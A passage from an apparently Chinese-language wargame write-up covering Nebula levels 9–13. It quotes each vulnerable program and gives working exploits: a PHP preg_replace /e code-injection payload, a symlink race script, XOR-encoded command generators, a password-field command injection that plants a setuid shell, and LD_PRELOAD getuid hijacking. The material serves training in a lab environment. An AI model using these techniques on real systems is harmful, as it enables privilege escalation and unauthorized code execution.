class="line">&#125;</span><br><span class="line"></span><br><span class="line">function markup($filename, $use_me)</span><br><span class="line">&#123;</span><br><span class="line">  $contents = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">  $contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);</span><br><span class="line">  $contents = preg_replace(&quot;/\[/&quot;, &quot;&lt;&quot;, $contents);</span><br><span class="line">  $contents = preg_replace(&quot;/\]/&quot;, &quot;&gt;&quot;, $contents);</span><br><span class="line"></span><br><span class="line">  return $contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = markup($argv[1], $argv[2]);</span><br><span class="line"></span><br><span class="line">print $output;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这个就是匹配文件中的emal地址，然后进行转换：.转为dot，@转为AT，试验下<br><code>echo &quot;[email AAA@BBB.CCC.DDD]&quot;&gt;/tmp/email;/home/flag09/flag09 /tmp/email</code><br>输出结果为</p>
<blockquote>
<p>AAA AT BBB dot CCC dot DDD</p>
</blockquote>
<p><code>preg_replace</code>在/e命令下，第二个参数会被代码执行<br>那么我们修改email文件内容为</p>
<blockquote>
<p><code>[email &quot;{${phpinfo()}}&quot;]</code></p>
</blockquote>
<p>运行程序发现打出php信息</p>
<blockquote>
<p><code>[email &quot;{${system(getflag)}}&quot;]</code></p>
</blockquote>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="About-10"><a href="#About-10" class="headerlink" title="About"></a>About</h3><p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.<br>To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.</p>
<h3 id="Source-5"><a href="#Source-5" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  char *file;</span><br><span class="line">  char *host;</span><br><span class="line"></span><br><span class="line">  if(argc &lt; 3) &#123;</span><br><span class="line">      printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);</span><br><span class="line">      exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  file = argv[1];</span><br><span class="line">  host = argv[2];</span><br><span class="line"></span><br><span class="line">  if(access(argv[1], R_OK) == 0) &#123;</span><br><span class="line">      int fd;</span><br><span class="line">      int ffd;</span><br><span class="line">      int rc;</span><br><span class="line">      struct sockaddr_in sin;</span><br><span class="line">      char buffer[4096];</span><br><span class="line"></span><br><span class="line">      printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);</span><br><span class="line"></span><br><span class="line">      fd = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line"></span><br><span class="line">      memset(&amp;sin, 0, sizeof(struct sockaddr_in));</span><br><span class="line">      sin.sin_family = AF_INET;</span><br><span class="line">      sin.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">      sin.sin_port = htons(18211);</span><br><span class="line"></span><br><span class="line">      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) &#123;</span><br><span class="line">          printf(&quot;Unable to connect to host %s\n&quot;, host);</span><br><span class="line">          exit(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">#define HITHERE &quot;.oO Oo.\n&quot;</span><br><span class="line">      if(write(fd, HITHERE, strlen(HITHERE)) == -1) &#123;</span><br><span class="line">          printf(&quot;Unable to write banner to host %s\n&quot;, host);</span><br><span class="line">          exit(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line">#undef HITHERE</span><br><span class="line"></span><br><span class="line">      printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);</span><br><span class="line"></span><br><span class="line">      ffd = open(file, O_RDONLY);</span><br><span class="line">      if(ffd == -1) &#123;</span><br><span class="line">          printf(&quot;Damn. Unable to open file\n&quot;);</span><br><span class="line">          exit(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      rc = read(ffd, buffer, sizeof(buffer));</span><br><span class="line">      if(rc == -1) &#123;</span><br><span class="line">          printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));</span><br><span class="line">          exit(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      write(fd, buffer, rc);</span><br><span class="line"></span><br><span class="line">      printf(&quot;wrote file!\n&quot;);</span><br><span class="line"></span><br><span class="line">  &#125; else &#123;</span><br><span class="line">      printf(&quot;You don&apos;t have access to %s\n&quot;, file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WP-9"><a href="#WP-9" class="headerlink" title="WP"></a>WP</h3><p>直接找了<a href="https://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level10/" target="_blank" rel="noopener">答案</a><br>This is commonly called a time-of-use to time-of-check or TOCTOU bug (<a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use" target="_blank" rel="noopener">Wikipedia’s example</a> is pretty much exactly the same issue)<br>在/tmp/建立token10 <code>touch /tmp/token</code><br>代码EOC1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line"> ln -fs /tmp/token /tmp/token10</span><br><span class="line"> ln -fs /home/flag10/token /tmp/token10</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>代码意思不停的建立软连接token连接到token10，连接/home/flag10/token连接到 token10一开始/tmp/token10是有权限的(就是/tmp/token)，但是后来是没有权限的(就是/home/flag10/token)<br>代码EOC2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line"> nice -n 19 /home/flag10/flag10 /tmp/token10 127.0.0.1</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>nice命令适用于以指定的进程调度优先级启动其他的程序。优先级是从-20～19 数字越小优先级越高<br>我们开3个ssh端口运行<code>nc -k -l 127.0.0.1 18211</code>,EOC1,EOC2。<br>接下来就是看脸了,<strong>nc</strong>的端口获取到flag10密码</p>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>这题题目出现了问题，有人重新编译了源码getflag成功了</p>
<h3 id="About-11"><a href="#About-11" class="headerlink" title="About"></a>About</h3><p>The /home/flag11/flag11 binary processes standard input and executes a shell command.<br>There are two ways of completing this level, you may wish to do both :-)<br>To do this level, log in as the level11 account with the password level11. Files for this level can be found in /home/flag11.</p>
<h3 id="Source-6"><a href="#Source-6" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Return a random, non predictable file, and return the file descriptor for it.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">int getrand(char **path)</span><br><span class="line">&#123;</span><br><span class="line">  char *tmp;</span><br><span class="line">  int pid;</span><br><span class="line">  int fd;</span><br><span class="line"></span><br><span class="line">  srandom(time(NULL));</span><br><span class="line"></span><br><span class="line">  tmp = getenv(&quot;TEMP&quot;);</span><br><span class="line">  pid = getpid();</span><br><span class="line">  </span><br><span class="line">  asprintf(path, &quot;%s/%d.%c%c%c%c%c%c&quot;, tmp, pid,</span><br><span class="line">      &apos;A&apos; + (random() % 26), &apos;0&apos; + (random() % 10),</span><br><span class="line">      &apos;a&apos; + (random() % 26), &apos;A&apos; + (random() % 26),</span><br><span class="line">      &apos;0&apos; + (random() % 10), &apos;a&apos; + (random() % 26));</span><br><span class="line"></span><br><span class="line">  fd = open(*path, O_CREAT|O_RDWR, 0600);</span><br><span class="line">  unlink(*path);</span><br><span class="line">  return fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void process(char *buffer, int length)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int key;</span><br><span class="line">  int i;</span><br><span class="line"></span><br><span class="line">  key = length &amp; 0xff;</span><br><span class="line"></span><br><span class="line">  for(i = 0; i &lt; length; i++) &#123;</span><br><span class="line">      buffer[i] ^= key;</span><br><span class="line">      key -= buffer[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  system(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define CL &quot;Content-Length: &quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  char line[256];</span><br><span class="line">  char buf[1024];</span><br><span class="line">  char *mem;</span><br><span class="line">  int length;</span><br><span class="line">  int fd;</span><br><span class="line">  char *path;</span><br><span class="line"></span><br><span class="line">  if(fgets(line, sizeof(line), stdin) == NULL) &#123;</span><br><span class="line">      errx(1, &quot;reading from stdin&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if(strncmp(line, CL, strlen(CL)) != 0) &#123;</span><br><span class="line">      errx(1, &quot;invalid header&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  length = atoi(line + strlen(CL));</span><br><span class="line">  </span><br><span class="line">  if(length &lt; sizeof(buf)) &#123;</span><br><span class="line">      if(fread(buf, length, 1, stdin) != length) &#123;</span><br><span class="line">          err(1, &quot;fread length&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      process(buf, length);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">      int blue = length;</span><br><span class="line">      int pink;</span><br><span class="line"></span><br><span class="line">      fd = getrand(&amp;path);</span><br><span class="line"></span><br><span class="line">      while(blue &gt; 0) &#123;</span><br><span class="line">          printf(&quot;blue = %d, length = %d, &quot;, blue, length);</span><br><span class="line"></span><br><span class="line">          pink = fread(buf, 1, sizeof(buf), stdin);</span><br><span class="line">          printf(&quot;pink = %d\n&quot;, pink);</span><br><span class="line"></span><br><span class="line">          if(pink &lt;= 0) &#123;</span><br><span class="line">              err(1, &quot;fread fail(blue = %d, length = %d)&quot;, blue, length);</span><br><span class="line">          &#125;</span><br><span class="line">          write(fd, buf, pink);</span><br><span class="line"></span><br><span class="line">          blue -= pink;</span><br><span class="line">      &#125;    </span><br><span class="line"></span><br><span class="line">      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);</span><br><span class="line">      if(mem == MAP_FAILED) &#123;</span><br><span class="line">          err(1, &quot;mmap&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      process(mem, length);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WP-10"><a href="#WP-10" class="headerlink" title="WP"></a>WP</h3><p>代码首先检查了<code>Content-Length:</code>字符串，后面跟的数字如果小于1024，那么进入方法1，否则进入方法2。前后两个方法都用了fread读入字符串字符串这个函数，这个函数有个问题：</p>
<ul>
<li>方法1返回值会为1</li>
<li>方法2返回值为输入字符个数<h4 id="WP1"><a href="#WP1" class="headerlink" title="WP1"></a>WP1</h4><blockquote>
<p>mark一下atoi函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int val;</span><br><span class="line">   char str[20];</span><br><span class="line">   </span><br><span class="line">   strcpy(str, &quot;98993489&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;字符串值 = %s, 整型值 = %d\n&quot;, str, val);</span><br><span class="line"></span><br><span class="line">   strcpy(str, &quot;runoob.com&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;字符串值 = %s, 整型值 = %d\n&quot;, str, val);</span><br><span class="line"></span><br><span class="line">   return(0);</span><br><span class="line">&#125;</span><br><span class="line">字符串值 = 98993489, 整型值 = 98993489</span><br><span class="line">字符串值 = runoob.com, 整型值 = 0</span><br><span class="line">也就是&apos;Content-Length: 1\nE&apos; 结果是1</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p><strong>仔细读代码可以发现 输入的长度1 按位与了255，结果还是一，然后E^1成为D，但是这个过程要等待buf清空</strong><br>大牛进行了一次实验</p>
<blockquote>
<p>echo -ne “Content-Length: 1\nE” | /home/flag11/flag11<br>sh: $’Dp\324’: command not found</p>
</blockquote>
<p>发现E变成了D，后面数字每次都会不同，有的时候会出现</p>
<blockquote>
<p>sh: D: command not found  </p>
</blockquote>
<p>这个就是代码执行。<br>那么，在tmp目录下用软连接方法，<code>ln -s /bin/getflag D</code>，将tmp加入path<code>export PATH=/tmp/:$PATH</code>，接着运行<code>echo -ne &quot;Content-Length: 1\nE&quot; | /home/flag11/flag11</code><br>可惜失败了</p>
<blockquote>
<p>getflag is executing on a non-flag account, this doesn’t count</p>
</blockquote>
<p>这里用了一个<a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/==" target="_blank" rel="noopener">技术</a>TODO==<br>技术使用叫做LD_PRELOAD的环境变量，LD_PRELOAD平常用于重写调试信息，它能控制堆栈信息，这意味着我们不用随机获取堆栈，我们可以控制堆栈<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=`python -c &apos;print &quot;/bin/getflag\x0a&quot;*1000&apos;`</span><br></pre></td></tr></table></figure></p>
<p>再次运行flag11，他会重复执行getflag</p>
<h4 id="WP2"><a href="#WP2" class="headerlink" title="WP2"></a>WP2</h4><p>这里关注长度大于1024的方法，既然我们知道了命令的加密方法，那我们反加密命令</p>
<p>EOC c代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main (int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    int length =1024;</span><br><span class="line">    char *cmd = &quot;getflag&quot;;</span><br><span class="line">    char buf[1024];</span><br><span class="line">    int key = length &amp; 0xff;</span><br><span class="line">    int i=0;</span><br><span class="line">    //把命令放入buf中其余为空</span><br><span class="line">    strncpy(buf,cmd,1024);</span><br><span class="line">    for(;i&lt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i]=buf[i]^key;</span><br><span class="line">        key = key -(buf[i]^key);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Content-Length: 1024&quot;);</span><br><span class="line">    //输出到控制台</span><br><span class="line">    fwrite(buf,1,length,stdout);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>EOC python 代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">string = &quot;/bin/getflag\x00&quot;</span><br><span class="line">key = 0</span><br><span class="line"></span><br><span class="line">enc_string = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for char in string:</span><br><span class="line">    enc_char = ord(char) ^ key &amp; 0xff</span><br><span class="line">    enc_string += chr(enc_char)</span><br><span class="line">    key = key - ord(char) &amp; 0xff</span><br><span class="line"></span><br><span class="line">print &quot;Content-Length: 1024\n&quot; + enc_string + &quot;\x00&quot; * (1024 - len(enc_string))</span><br></pre></td></tr></table></figure></p>
<p>整个环境在<strong>TEMP</strong>这个环境变量中，我们要把TEMP切换到EOC的环境下</p>
<h4 id="WP3"><a href="#WP3" class="headerlink" title="WP3"></a>WP3</h4><p>有一个人声称自己用了ssh注入的方式getflag <a href="https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9" target="_blank" rel="noopener">链接</a></p>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="About-12"><a href="#About-12" class="headerlink" title="About"></a>About</h3><p>There is a backdoor process listening on port 50001.<br>To do this level, log in as the level12 account with the password level12. Files for this level can be found in /home/flag12.</p>
<h3 id="Source-7"><a href="#Source-7" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">local socket = require(&quot;socket&quot;)</span><br><span class="line">local server = assert(socket.bind(&quot;127.0.0.1&quot;, 50001))</span><br><span class="line"></span><br><span class="line">function hash(password)</span><br><span class="line">  prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)</span><br><span class="line">  data = prog:read(&quot;*all&quot;)</span><br><span class="line">  prog:close()</span><br><span class="line"></span><br><span class="line">  data = string.sub(data, 1, 40)</span><br><span class="line"></span><br><span class="line">  return data</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while 1 do</span><br><span class="line">  local client = server:accept()</span><br><span class="line">  client:send(&quot;Password: &quot;)</span><br><span class="line">  client:settimeout(60)</span><br><span class="line">  local line, err = client:receive()</span><br><span class="line">  if not err then</span><br><span class="line">      print(&quot;trying &quot; .. line) -- log from where ;\</span><br><span class="line">      local h = hash(line)</span><br><span class="line"></span><br><span class="line">      if h ~= &quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot; then</span><br><span class="line">          client:send(&quot;Better luck next time\n&quot;);</span><br><span class="line">      else</span><br><span class="line">          client:send(&quot;Congrats, your token is 413**CARRIER LOST**\n&quot;)</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  client:close()</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h3 id="WP-11"><a href="#WP-11" class="headerlink" title="WP"></a>WP</h3><ul>
<li>什么是Lua</li>
<li><blockquote>
<p>Lua 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放， 其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。</p>
</blockquote>
</li>
<li>什么是…</li>
<li><blockquote>
<p>在lua中可以使用…表示可变长参数，在函数内通过表访问可变参数</p>
</blockquote>
<p>io.popen中存在代码执行，我们把password伪装一下，让他帮我们编译一个程序，getshell也行，getflag也行 password=<code>1; gcc -o /tmp/shell /tmp/shell.c; cp /tmp/shell /home/flag12; chmod +s /home/flag12/shell ;echo 1</code></p>
</li>
</ul>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="About-13"><a href="#About-13" class="headerlink" title="About"></a>About</h3><p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.<br>To do this level, log in as the level13 account with the password level13. Files for this level can be found in /home/flag13.</p>
<h3 id="Source-8"><a href="#Source-8" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define FAKEUID 1000</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int c;</span><br><span class="line">  char token[256];</span><br><span class="line"></span><br><span class="line">  if(getuid() != FAKEUID) &#123;</span><br><span class="line">      printf(&quot;Security failure detected. UID %d started us, we expect %d\n&quot;, getuid(), FAKEUID);</span><br><span class="line">      printf(&quot;The system administrators will be notified of this violation\n&quot;);</span><br><span class="line">      exit(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // snip, sorry :)</span><br><span class="line"></span><br><span class="line">  printf(&quot;your token is %s\n&quot;, token);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WP-12"><a href="#WP-12" class="headerlink" title="WP"></a>WP</h3><h4 id="WP1-1"><a href="#WP1-1" class="headerlink" title="WP1"></a>WP1</h4><p>第一种方式是玩GDB设置状态为$eax 为源代码所写的1000<br>GDB的用法为 </p>
<blockquote>
<p>gdb file<br>(gdb)r 表示运行<br>(gdb)b [函数名|行数(未混淆)] 设置断点<br>(gdb) s/si 单步运行(/源码汇编)<br>(gdb) l/list 列出源码<br>(gdb) disas 列出汇编<br>(gdb) info 打出信息 如：r/regist 打出内存信息</p>
</blockquote>
<p>简略可参考<a href="https://blog.csdn.net/liigo/article/details/582231/" target="_blank" rel="noopener">这里</a><br>详细可参考<a href="https://wenku.baidu.com/view/416a53140b4e767f5acfce2f.html" target="_blank" rel="noopener">这里</a></p>
<h4 id="WP2-1"><a href="#WP2-1" class="headerlink" title="WP2"></a>WP2</h4><p>劫持getuid的函数。这里用到LD_PRELOAD环境变量。<br>LD_PRELOAD可以影响程序运行时的链接，这个变量允许你定义在程序运行时优先加载的动态链接库。  </p>
<p>新建我们的getuid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">uid_t getuid(void) &#123;return 1000;&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译<code>gcc -shared -fPIC mygetuid.c -o mygetuid.so</code>放入LD_PRELOAD<code>export LD_PRELOAD=&quot;/home/level13/mygetuid.so&quot;</code>。<br>大牛提示</p>
<blockquote>
<p>这里需要注意一点，需要将/home/flag13/flag13复制到/home/level13/下面运行才可以，因为需要flag13和这个so文件的ruid是一样的才可以。</p>
</blockquote>
<p>运行flag13获取token</p>
